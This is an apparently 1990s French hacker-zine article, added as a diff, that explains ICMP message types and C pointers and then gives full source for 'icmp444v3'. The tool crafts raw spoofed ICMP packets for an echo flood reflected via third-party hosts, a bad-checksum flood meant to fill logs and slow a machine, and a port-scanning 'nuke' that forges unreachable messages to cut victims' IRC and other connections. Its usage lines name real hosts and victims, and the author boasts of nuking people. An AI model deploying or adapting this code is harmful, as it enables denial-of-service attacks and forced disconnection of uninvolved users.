@@ -1,0 +1,768 @@
+##############################################################################
+------------------------------------------------------------------------------
+ ---------------------Le Monde Magique Du Spoof ICMP-------------------------
+ ---------------------------------By----------------------------------------
+  -------------------------------CoD4--------------------------------------
+   ----------------------------------------------------------------------
+
+Hello les tits gros si vous vous etes deja promene' sur l'irc ces derniers
+temps vous avez surement entendu de droles de mecs (nous :) parler de drole
+de truc, un truc genre NUKE echo port inaccessible etc bref du latin :) pis 
+la seule reponse que vous avez pu obtenir je la connais bien car c moi ki
+vous repondait se resumait a ca (" C Du Spoof ICMP " ) !!! voila mais kesako
+le SPOOF icmp ! STOP  deja abordons le sujet comme il se doit !!!
+
+1: ICMP
+l'icmp veut dire en bon anglais Internet Control Message Protocol
+ki en bon francais veut dire protocole internet de message de controle
+l'icmp est souvent considere comme faisant partie de la couche IP bien 
+que ce soit pas tous a fait vrai mais comme on n'est pas des casse-couilles
+on va dire ke oui 
+
+<------------Datagramme IP------------------> 
+
+ -------------------------------------------
+ | en tete IP      |    message ICMP       |
+ -------------------------------------------
+    20 octets
+
+1.2: a koi c t'il donc ki sert cette ICMP 
+icmp comme son nom l'indike nous informer ou permet de tenir informe'
+ les machines routeurs etc de tout ce qui se passe par exemple si vous
+faite un telnet sur une machine ki existe pas (ex: 123.123.123.123 ) 
+
+SpOOfy:~# telnet 123.123.123.123
+Trying 123.123.123.123...
+telnet: Unable to connect to remote host: Network is unreachable
+
+vous voyez au bout d'un moment que la machine existe pas comment telnet
+a pu savoir ca, vous allez me dire . tres simplement grace a un message
+ICMP qu'un routeur lui a envoye' voila un en gros a koi ICMP sert
+il nous permet d'avoir des informations vitales sur les connexions en cours
+( en general car icmp est aussi utilise' par les routeurs )
+
+voyons maintenant a koi ressemble un message ICMP
+
+
+ 0             7 8            15 16                            31
+ | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |
+ ---------------------------------------------------------------
+ |type sur 8 bit|code sur 8 bit| somme de controloe sur 16 bit |
+ ---------------------------------------------------------------
+ |                                                             |
+ |             contenu dependant du type et du code            |
+ |                                                             |
+ |_____________________________________________________________|
+ 
+
+
+1.3 TYPES DE MESSAGES ICMP 
+
+
+no route to host = NRTH
+connection refused = CR
+network is unreachable = NIU
+message too long =  MTL
+protocol not available = PNA
+
+( ce sont les mesages ke l'on recevons nous utilisateur avec tel type/code
+  d'icmp )
+
+type | code | description 
+-------------------------------------------------------------------------
+ 0   | 0    | reponse echo (lorske vous repondez a un ping )
+-------------------------------------------------------------------------
+  3  |  0   | reseau inaccessibe            NRTH  
+     |  1   | machine inaccessibe           NRTH
+     |  2   | protocole inaccessibe         CR
+     |  3   | port inaccessibe              CR
+     |  4   | fragementation necessaire mais bit de fragmentation a 0 MTL
+     |  5   | echec de la route source      NRTH  
+     |  6   | reseau de destination inconnue NIU
+     |  7   | machine de destination inconnue NRTH
+     |  9   | reseau de destination administrativement interdit NIU
+     | 10   | machine ""    "  "         "     "        "  "    NRTH
+     | 11   | reseau inaccesible pour TOS (type of service )     NIU
+     | 12   | machine inaccesible pour TOS                      NRTH
+     | 13   | communication administrativement interdite  (ignore)
+     | 14   | violation de la precedence de la machine (?!?)
+     | 15   | coupure de la precedence en action       (?!?) 
+------------------------------------------------------------------------
+ 4   |  0   | debit trop eleve
+------------------------------------------------------------------------
+ 5   |  0   | redirige pour un reseau |  table de routage mis a jour
+     |  1   | redirige pour une machine |table de routage mis a jour
+     |  2   | redirige pour type de service et de reseau | "" "" "" 
+     |  3   | redirige pour type de service et de machine| "" "" ""
+___________________________________________________________________________ 
+  8  |  0   | requete echo   | le noyau genere une reponse hehe ping rulez
+---------------------------------------------------------------------------
+  9  |  0   | avertissement de routeur 
+  10 |  0   | sollicitation de routeur
+---------------------------------------------------------------------------
+  11 |  0   | time to live vaut 0 pendant le transit 
+     |  1   | time to live vaut 0 pendant le reassemblage
+---------------------------------------------------------------------------
+  12 |  0   | mauvais en tete IP (erreure attrape tout )  PNA
+     |  1   | option requise manquante                    PNA
+---------------------------------------------------------------------------
+ bon y'a pas tout bien sur mais disons ke cela nous suffisse largement :)
+(marre de copier le bookin moi)
+ 
+voyons precisement les different type ( les plus sympa pour nous ;)
+
+1.4 le type 3 
+
+tous les message de type 3 on tous le meme format !!
+ 0             7 8            15 16                            31
+ | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |
+ ---------------------------------------------------------------
+ | type (3)    | Code (0-15)   | somme de controloe sur 16 bit |
+ ---------------------------------------------------------------
+ |                 inutilise doit etre a zero                  |
+ ---------------------------------------------------------------
+ |                                                             |
+ |  EN-TETE IP DU DATAGRAMME QUI A GENERE L'ERREUR             |
+ /                                                             /
+ |                                                             |
+ |-------------------------------------------------------------|
+ |            les 8 premiers octets de donne du datagramme IP  |
+ |      -(ex: les 8 premies octets de l'en-tete UDP ou TCP  )- | 
+ |-------------------------------------------------------------|
+
+
+
+ l'element important a retenir ce sont les 8 derniers octets !
+ ( ce sont l'en-tete UDP et TCP) car ce noyau peut ainsi associer
+  le processus utilisateur ki a cause' l'erreur )
+  voici un exemple plus concret :)
+  
+ex: je suis sur l'irc je me suis connect sur le port 6667 de
+  irc.stealth.net  now  faisons un netstat sur notre machine
+
+tcp        0      0 ppp06.devil.fr:1558     irc.stealth.net:6667   ESTABLISH
+
+nous voyons la le port de source  de notre client irc 1558 pis le port de 
+destination . alors voila  imaginons l'espace d'un instant ke le port 6667
+n'est plus accessible (le serveure irc a plante par exemple ! ) 
+nous allons recevoir un icmp de type 3 code 3 (port inaccessible ) donc
+notre kernel tous gentil k'il est va couper notre connex avec le serveur
+( et oui il a plante ;)) plus a la peine de continuer :) mais comment a
+t'il pu savoir ke c'etait tel process ou tel autre ! tres simple :)
+il regarde en detail l'icmp ki lui as ete retourne il regarde le port source
+ki as cause' l'erreur ici c 1558 puis il regarde le port de destination
+ici c 6667 et HOP ! il regarde ki utilise cette port de source et de
+destination c aussi bete que cela !! 
+
+( le message icmp  contient comme je l'avais dis l'en tete IP puis les 8 octets
+ de data ki suivent cette en-tete donc les 8 premiers octets de l'en tete  TCP
+ ou UDP  donc dans cette en-tete nous avons le port source et le port
+ destination ( c valable pour tcp- - et UDP))                        
+
+vous avez le principe meme du nuke le VRAI NUKE pas winhack ( je dis ca pour
+les mecs ki mon gavais sec en disons ke je ne pouvais les nuke mouhahah
+les povres je les ai nuke' comme des merdes =)) !!!
+
+c a dire fabriker des pakets icmp ki feront croire au serveur ou au client
+que la liaison est perdue hehe (donc ki va killer son process ;) 
+mais comme vous le savez surement on peut pas savoir a distance 
+le numero de port source du client ou destination du serveur (dans le cas
+ ou nous on envoie au client l'icmp ) 
+c pour ca ke nous devons en fabriker plusieurs juska trouver le 2 port ki 
+corresponde ! ce ki n'est pas dur car 90% des gens se connet sur l'irc en
+port 6667  et comme les numero de port alloue au process commence a 1024 
+il suffit d'envoyer des icmp (type 3 code 3)  jusk"a trouver le bon port
+source !!!
+ce que fait mon icmp444v3.c avec l'option N
+
+icmp444 N ppp45.suxx.com 1000 irc.devil.com 6667 2 
+ICMP444 ready for action ! CoD4 #PhE
+
+....
+port,tport:1000,6667
+
+sport,tport:1001,6667
+
+sport,tport:1002,6667
+
+sport,tport:1003,6667
+
+sport,tport:1004,6667
+
+sport,tport:1005,6667
+
+sport,tport:1006,6667
+
+sport,tport:1007,6667
+
+....
+
+sport: port source  voila on lance les pakets plus qua attendre a avoir
+le bon port source  pour voir le mec se deconex de l'irc ( et voui si 
+la mec a un port de destination autre ke 6667 en on scan pour rien !!
+car i faut ke les 2 ports correspondent !! )
+
+1.4:le type 8  
+voyons maintenant une deuxieme type  le fameux echo request ! 
+
+ 0             7 8            15 16                            31
+ | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |
+ ---------------------------------------------------------------
+ | type (8)    | Code (0)      | somme de controloe sur 16 bit |
+ ---------------------------------------------------------------
+ |       IDENTIFICATEUR        | numero de sequence            |
+ ---------------------------------------------------------------
+ |                                                             |
+ |                      Donnees optionnelles                   |
+ /                                                             /
+ |                                                             |
+ ---------------------------------------------------------------
+
+ l'identiticateur est le numero ki identifie le processus ki a lance'
+  un ping (un espece de pid c ke lorsque le ping arrive mr le noyau c 
+ a ki donner le resulat) 
+
+ le numero de sequence bha c ca :
+64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=17.5 ms
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=16.8 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=17.1 ms
+
+faut pas faire syn-cyr (mauvais jeux de mots avec le syn ;)))
+
+voici comment marche  le echo request lorske notre machine
+recoit une demande d'echo elle va y repondre comme ceci elle va creer
+le meme paket ke ci dessus mais type 0 code 0 puis elle va renvoyer
+exactement  le meme nombre de data ke nous lui avons envoye' !
+( ca veux dire ke si dans le champ donnees optionnelles on avait mis
+ 1000 octets de data en en reply on aurais 1000 octet de data )
+
+voici un paket icmp de type reponse echo
+
+0             7 8            15 16                            31
+ | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |
+ ---------------------------------------------------------------
+ | type (0)    | Code (0)      | somme de controle sur 16 bit  |
+ ---------------------------------------------------------------
+ |       IDENTIFICATEUR        | numero de sequence            |
+ ---------------------------------------------------------------
+ |                                                             |
+ |                      Donnees optionnelles                   |
+ /                                                             / 
+ |                                                             | 
+ --------------------------------------------------------------- 
+
+
+donc se ki est marrant a faire c de spoofe le icmp echo requeste pour 
+ke la victim reply  vers une autre machine !! c ki ke votre ping est plus
+efficace car le resultat ne vous revient pas dessus !!!
+
+2: BUG du kernel avec icmp
+
+lors des essais de ICMP444 j'ai pus remarquer ke le  kernel generait une
+erreur avec une simple paket icmp ki avait une erreur de cheksum ! le plus
+drole comme c inscrit dans les log !! la taille du /var/adm/messages 
+augement TRES rapidement ET votre machine se mais a RALENTIR a une vitesse
+FARAMINEUSE !! c totalment hallucinatoire !! je n'ose pas imaginer
+la machine si une T1 lui balance se genre de traitement !!( disk plein 
+voir CRASH assurer c pour dire 24 octets envoye's en font gagner plus de
+80 rien ke le /var/adm/messages ! est oui c ke ca prends de la place
+des milliers de lignes signalent ke l'icmp a une erreurs de somme de 
+controle !! ICMP444 inclut l'option O ki vous permettra de tester ca ! 
+( bien sur, ke sur vos propres machines hin ? =)
+
+imcp444v3 O www.fbi.gov www.nasa.gov ip_of_victim 
+
+croyez moi c tres tres impresionnants ! 
+( au fait c pas la peine de faire de l'irc pendant ca, ca bouffe toutes les 
+bandes passantes :)
+
+3: probleme de securite de ICMP 
+
+comme vous l'avais constate' ICMP c un peu sur koi tout le rezo repose
+et vu la facilite de spoofer de l'icmp on peut imaginer pas mal de choses
+
+1: modifier tout un rezo interne a sa maniere (graca au redirection ICMP) 
+2: CRASHER un machine ! 
+3: deconnecter ki on veut (irc,rlogin etc )
+4: surcharger la bande passante de la machine 
+
+comme vous le voyez les problemes sont surtout les attakes par refus de 
+service . oui voux allez me dire ke ca ne mene a rien pour le hackeur 
+pas si sur: imaginez un firewall ki protege un enorme reseau ki n"as pas le
+droit, serait-ce meme une heure, de s'arreter !! si le firewall tombe en panne
+comment va t'il faire !! il va surment faire un plan d'urgence ki va
+consister a faire passer le trafic ailleurs donc plus de firewall genant !
+pensez i des fois c en cassant les murailles ke l'on rentre le plus 
+facilment !
+
+4:  ICMP444v3
+
+icmp444v3 et un tit prog que j'ais fait pour illustrer mes propos 
+
+icmp444v3 est un nuker  un echo spoofeur et  il utilise le bug 
+du kernel cite plus haut ! je maet a votre disposition le source commente
+mais kelke notion de prog en C sont nessecaire mais ca pas la galere 
+nan plus  !! j'ai fait une petit intro sur les pointeurs avant car c
+toujours le truc qu'on oublie =) ( c vrai :)
+
+
+5: intro hardcrad sur les pointeurs 
+
+pas de theorie du pratike !!!
+
+
+int *ptr;      ptr est un pointeurs 
+int i,X;       une tite variable i (taille des int en C "standard": 4 octets)
+
+ptr=&i;         now le pointeurs  pointe sur l'adresse de i !
+*ptr=2;        l'endroit pointer par ptr = 2; (donc notre cas i=2 now :)
+X=*ptr;        X = l'endroit pointer par ptr c a dire 2 !   
+
+
+X=*(ptr+1);     X = l'endroit + 4 en memoire !  en gros X ne recoit pas le
+                valeur pointer directement par ptr mais celle 4 octets plus haut
+                dans la memoire  
+
+Attention a l'arithmetique sur les pointeurs ! si ptr pointe sur un objet
+de taille n (ici n=4 pour le type int), faire *(ptr+i) va chercher a
+l'endroit en memoire donne' par: ptr+i*n;
+Par exemple:
+for( i=0; i<10; ++i ) { X = *Ptr++; } va donner a X les valeurs pointe'es
+par Ptr, et Ptr sera incremente' de 4 a chaque fois.
+
+<------memoire------->
+|ptr|  |  |  |  |  |    en faite X recoit la valeur 4 !!  
+  2  4  11 22 33 12
+
+      |     |
+ ptr+ 1     |
+ ptr+3---- -|   enfin vous avez compris :)
+
+    
+*(  (unsigned long *)   (data+4) ) = 6580; alors la ca s'appelle un cast 
+
+est c pas tres dur a piger en gros imaginons ca
+
+long *lo;
+char c; 
+
+c=10;
+*lo=c;   la sa pose probleme car les types char sont stocke's sur 1 octet
+         et le type long sur 4 octets  ce ki fait ke lo va recevoir une
+         valeur erronee  pour faire ke notre char soit stocke' correctement
+	 En fait, le C a des regles d'overloading de types quand il n'y
+	 a pas incompatibilite'. En general, il rajoute des zeros (ici,
+	 il en rajoute 3). ATTENTION !! Il y a des problemes si on
+	 assigne une variable signe'e a une variable *non* signe'e (ou
+	 l'inverse). De meme, si on assigne un valeur d'un variable
+	 de n octets a une autre variable de taille infe'rieure a n.
+
+	 ATTENTION egalement aux regles de pre-seance entre le
+	 cast et les operations arithmetiques sur les pointeurs.
+	 Essayez de compiler ca, pour voir:
+
+main() {
+   char *ptr;
+   ptr = (char *)0xdeadbeef;
+   printf( "0x%x\n", (int *)ptr+4  );
+   printf( "0x%x\n", (int *)(ptr+4)  );
+}
+
+	Prudence, donc ! :)
+	
+
+
+
+                  
+struct iphdr   *ip; on dit ke ip est un pointeur vers structure 
+
+ip = (struct iphdr *)packet; la on dis ke ip aurat maintenant 
+                             adresse memoire ke paket (une zone memoire)
+                             et la c pareil ke l'autre la haut on fait ke
+                             l'addresse de  paket soit bien au format de ip
+                      
+ip->daddr=10;    tres tres simple comme ip est un  pointeur sur structure 
+                 la ip pointe vers la variable daddr de sa  structure 
+
+
+voila c tous puis hin bon pas toujours obliger de comprendre tous de A a Z !
+ faut dire ke moi je me perd sec aussi =)                  
+
+ 
+
+bon GO ! NOW !
+
+/*
+ * icmp444.c  ver 0.3  pareil ke la ver 0.2 mais avec
+ un nuker integrer :)
+  
+ 
+ 
+devil~#  icmp444c E www.nasa.gov ip_of_sucker  size_of_echo
+ 
+for  overload a machine: 
+ 
+devil~# icmp444 O  www.nasa.gov www.fbi.gov  ip_of_sucker
+
+
+ok it's all :) 
+
+CoD4 #phe  boor@hotmail.com
+
+greetz giemor pirus mikasoft 
+
+*/
+
+#define IPHDRSIZE sizeof(struct iphdr)
+#define ICMPHDRSIZE sizeof(struct icmphdr)
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <signal.h>
+#include <fcntl.h>
+#include <syslog.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/ioctl.h>
+#include <sys/stat.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <linux/ip.h>
+#include <linux/icmp.h>
+#include <linux/tcp.h>
+#include <linux/udp.h>
+#include <netinet/ip_icmp.h>
+
+#ifdef SYSV
+#define bcopy(s1,s2,len) memcpy(s2,s1,len)
+#endif
+
+
+ /*   fonction rippe'e  ki sert a calculer les cheksums  */
+
+/*
+ * in_cksum --
+ *  Checksum routine for Internet Protocol family headers (C Version)
+ */
+unsigned short in_cksum(addr, len)
+    u_short *addr;
+    int len;
+{
+    register int nleft = len;
+    register u_short *w = addr;
+    register int sum = 0;
+    u_short answer = 0;
+ 
+    /*
+     * Our algorithm is simple, using a 32 bit accumulator (sum), we add
+     * sequential 16 bit words to it, and at the end, fold back all the
+     * carry bits from the top 16 bits into the lower 16 bits.
+     */
+    while (nleft > 1)  {
+        sum += *w++;
+        nleft -= 2;
+    }
+ 
+    /* mop up an odd byte, if necessary */
+    if (nleft == 1) {
+        *(u_char *)(&answer) = *(u_char *)w ;
+        sum += answer;
+    }
+ 
+    /* add back carry outs from top 16 bits to low 16 bits */
+    sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
+    sum += (sum >> 16);         /* add carry */
+    answer = ~sum;              /* truncate to 16 bits */
+    return(answer);
+}
+
+/* autre fonction ripe'e ki sert a convertir les noms en ip */
+
+unsigned int host2ip(char *serv)
+{
+   struct sockaddr_in sin;
+   struct hostent *hent;
+      
+   hent = gethostbyname(serv);
+   if(hent == NULL) return 0;
+   bzero( (char *)&sin, sizeof(sin) );
+   bcopy(hent->h_addr, (char *)&sin.sin_addr, hent->h_length);
+   return sin.sin_addr.s_addr;
+}
+
+/* on attakons the kOd */
+                    
+main(int argc, char **argv)
+{
+   struct sockaddr_in sin_dst;
+   unsigned char packet[4098];
+   struct iphdr   *ip;
+   struct icmphdr *icmp;
+   struct iphdr   *ipfake;
+   unsigned char  *data;
+   
+   unsigned           s_port;
+   unsigned           t_port;
+                               
+   int s;
+   int i;
+   int DATA;
+   int s_portinc,t_portinc;
+   
+   ip = (struct iphdr *)packet;
+   icmp = (struct icmphdr *)(packet+IPHDRSIZE);
+   ipfake = (struct iphdr*)(packet+IPHDRSIZE+ICMPHDRSIZE );
+   data = (char *)(packet+IPHDRSIZE+ICMPHDRSIZE+IPHDRSIZE);
+   
+   memset(packet, 0, 4098);
+   
+   printf(" ICMP444 ready for action ! CoD4 #PhE\n\n");
+   
+   if(argc == 1) {
+   
+      printf(" for make a flood echo spoofing \n");
+      printf(" icmp444 E <spoof adresse> <ip of victim> <size of paket>\n");
+      printf(" ~#icmp444 E www.nasa.gov  ppp123.sucker.com 1000\n\n");
+      printf(" for the overload the machine \n");
+      printf("icmp444 O <spoof ip one > <spoof ip two > <ip of victim>\n");
+      printf("~icmp444 0 www.nasa.gov www.fbi.gov ppp42.sucker.com \n\n");
+      printf("NUKE !!!\n\n");
+      printf("  generic nuke (icmp to the serveur)\n\n");
+      printf("icmp444 X <destination op paket > <port source > <ip of source> <port of destination++;> <code of icmp (like 2 ) > \n");
+
+      printf("~#icmp444 X irc.devil.com 6667 ppp45.sucker.com 1020 2 \n\n");
+      printf("for nuke a man on unix or win 95 & NT (is cool for the bot ;)) \n ");
+      printf("icmp444 X <destination op paket > <port source++; > <ip of source> <port of destination> <use 2 ;)> \n"); 
+      printf("icmp444 N  ppp56.sucker.com 1020 irc.devil.com 6667 2 \n\n");
+      printf(" voila :)\n\n CoD4  boor@hotmail.com\n");   
+      exit(0);
+   }
+   
+   /* ziva ke je t'ouvre une raw-chaussette */
+   
+   s = socket(AF_INET, SOCK_RAW, 255);
+   if (s < 0)
+   {
+      fprintf(stderr, "cant open raw socket\n");
+      exit(0);
+   }
+   
+      /*  bha je sais comment expliker ca mais disons ke c pour dire 
+          au reseau kon va faire nos propre tit pakete ( mais vraiment 
+          gros ) */
+
+#ifdef IP_HDRINCL
+   if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&i, sizeof(i)) < 0)
+   {
+      fprintf(stderr, "cant set IP_HDRINCL\n");
+      close(s);
+      exit(0);
+   }
+#endif
+   
+        /* la on aorde le ECHO flood SPOOF */
+
+   if ( argv[1][0]=='E')
+   {
+
+      DATA = atoi(argv[4]);  /* la taille du data */
+
+      /* on mais dans l'en tete IP nos adresse de soure et destination */
+
+      ip->saddr    = host2ip(argv[2]);  /* la spoof adresse */
+      ip->daddr    = host2ip(argv[3]);
+      ip->version  = 4;
+      ip->ihl      = 5; 
+      ip->ttl      = 255;
+      ip->protocol = 1; 
+      ip->tot_len  = htons(IPHDRSIZE +ICMPHDRSIZE+DATA); /* taille */
+
+      ip->tos      = 0;
+      ip->id       = 0;
+      ip->frag_off = 0;
+      ip->check    = in_cksum(packet,IPHDRSIZE);  /* cheksum du pakeip */
+
+      icmp->type = 8;   /* type et code de l'eche reply */ 
+      icmp->code = 0;
+
+      icmp->checksum = in_cksum(icmp,ICMPHDRSIZE+DATA); 
+
+      /* cheksum du paket icmp faut pas oubier DATA nan plus          */
+      /* comme la fonction sendto a besoin de certain truc            */
+      /* vi faut remplire la struct sockaddr  mais bon c pas terrible */
+
+      sin_dst.sin_addr.s_addr = ip->daddr;
+      sin_dst.sin_family = AF_INET; 
+
+      printf(" HEY ! %s u r dead  \n",argv[3] );
+
+      for(;;){
+         sendto( s,packet,IPHDRSIZE+ICMPHDRSIZE+DATA,0,
+             (struct sockaddr *)&sin_dst,sizeof(struct sockaddr) );
+      }
+   }
+
+
+/* Hop la une tite  boucle ki envoye au mec de jolie tit echo requeste 
+ spoofer mouhahahaha si il manke des 'B" c ke mon B deconne grave     */
+
+/* l'option overload le truc est tres simple c de faire une erreur de 
+ chsksum  */
+
+   if ( argv[1][0]=='O' )
+   {
+     unsigned int IP1;
+     unsigned int IP2;
+     
+     /* on se la joue classique */
+     
+     IP1 = host2ip( argv[2] ); 
+     IP2 = host2ip( argv[3] );   
+     ip->daddr    =  host2ip( argv[4] );                  
+     ip->version  = 4;
+     ip->ihl      = 5;
+     ip->ttl      = 255;
+     ip->protocol = 1;
+     ip->tot_len  = htons( IPHDRSIZE +ICMPHDRSIZE );
+     ip->id       = 2;
+     ip->frag_off = 0;
+     ip->tos      = 0; 
+     ip->check    = in_cksum(packet,IPHDRSIZE); 
+    
+/* on mais le type et le code kon veut on s'en balance sec */
+
+     icmp->type = 3;
+     icmp->code = 5;
+     icmp->checksum = 1234; /* la on voit le beau cheksum :))) */
+
+     printf(" HEY ! %s  humm U have a 8086 ???  \n",argv[4] );                                           
+  
+     for(;;)
+     {
+       ip->saddr = IP1;
+       sin_dst.sin_addr.s_addr = ip->daddr;
+       sin_dst.sin_family = AF_INET;
+    
+       sendto( s,packet,IPHDRSIZE+ICMPHDRSIZE,0,
+           (struct sockaddr *)&sin_dst,sizeof(struct sockaddr) );
+    
+       ip->saddr = IP2;
+       sin_dst.sin_addr.s_addr = ip->daddr;
+    
+       sendto( s,packet,IPHDRSIZE+ICMPHDRSIZE,0,
+          (struct sockaddr *)&sin_dst,sizeof(struct sockaddr) );
+     }
+                 
+  }
+
+   /* re tite  boucle de fou :)) */
+ 
+
+/* heheh des GOTO =) je sais ca fait pas serieux mais hin je fais pas
+ demomaker moi je cree ca marche BASTA ! nan mais de toute celui
+ k pas d'accord je le nuke a vie !                             */
+
+   if( argv[1][0]=='X' )
+   { 
+      s_portinc=0;
+      t_portinc=1;
+      goto go;
+   } 
+
+   if ( argv[1][0]=='N' )
+   {
+      s_portinc=1;
+      t_portinc=0;
+go:
+
+/* pour la nuke pas de secret  c le meme en tete ip */
+  
+   ip->saddr    = host2ip( argv[4] );
+   ip->daddr    = host2ip( argv[2] );
+   s_port=atoi( argv[3] );
+   t_port=atoi( argv[5] );
+                                  
+   ip->version  = 4;
+   ip->ihl      = 5;
+   ip->ttl      = 255;
+   ip->protocol = 1;
+   ip->tot_len  = htons( IPHDRSIZE+ICMPHDRSIZE+IPHDRSIZE+8 );
+   ip->tos      = 0;
+   ip->id       = 2;
+   ip->frag_off = 0;
+   ip->check    = in_cksum( packet, IPHDRSIZE );
+                                                                                                  
+
+   /* toujours le type 3 ! le code c comme vous voulez */                                                                                                  
+   icmp->type = 3;
+   icmp->code = atoi( argv[6] );
+
+
+   /* on commence a creer ce soit disant datagramme ki aurait causer l'erreure */
+   /* la vous voyez c le datagramme kon va renvoyer avec l'icmp piger         */
+
+   ipfake->saddr = ip->daddr; 
+   ipfake->daddr = ip->saddr;
+
+   ipfake->version  = 4;
+   ipfake->ihl      = 5;
+   ipfake->ttl      = 255;
+   ipfake->protocol = IPPROTO_TCP;
+   ipfake->tot_len  = htons(IPHDRSIZE+36);
+   ipfake->tos      = 0;
+   ipfake->id       = 22;
+   ipfake->frag_off = 0;
+   ipfake->check    = in_cksum(ipfake,IPHDRSIZE);
+
+
+   for(;;)
+   {
+
+/* la on cree l'en tete tcp   */
+/* on mais le port source etc */
+
+      *( (unsigned int *)data )          = htons(s_port); 
+      *( (unsigned int *)(data+2) )      = htons(t_port);
+      *( (unsigned long *)(data+4) )     = 6580;
+
+/* SURTOUT oulier pas de remetre a 0 le cheksum avant de le calculer !!*/
+
+      icmp->checksum=0;
+      icmp->checksum = in_cksum(icmp,36);
+
+/* toujours pareil nos sales struct a remplir */
+
+      sin_dst.sin_addr.s_addr = ip->daddr;
+      sin_dst.sin_family = AF_INET;                     
+
+      sendto( s,packet,IPHDRSIZE+36,0,
+       (struct sockaddr *)&sin_dst,sizeof(struct sockaddr) ); 
+
+      printf( "sport,tport:%i,%i\n\n",s_port,t_port );
+
+      s_port = s_port+s_portinc;
+      t_port = t_port+t_portinc;
+                                           
+      usleep(200);
+   }
+ }
+}
+
+/* FIN */
+
+Bon voila   c vrai ke le code est pas bien dur a capter bon esperons 
+ke vous l'etes donne' en lisant ca car apres on attake le detournement 
+de routeur   =) hehe 
+
+bon    un special  -** jt'encule a tous ce ki nous aime pas **-
+voir meme limite bat a clou kwa =)
+
+pis oublier pas ke Now #phe c sur dalnet !!!!!
+
+CoD4  < tin faut j'aille me hacker un micro onde mwa >
+.
+
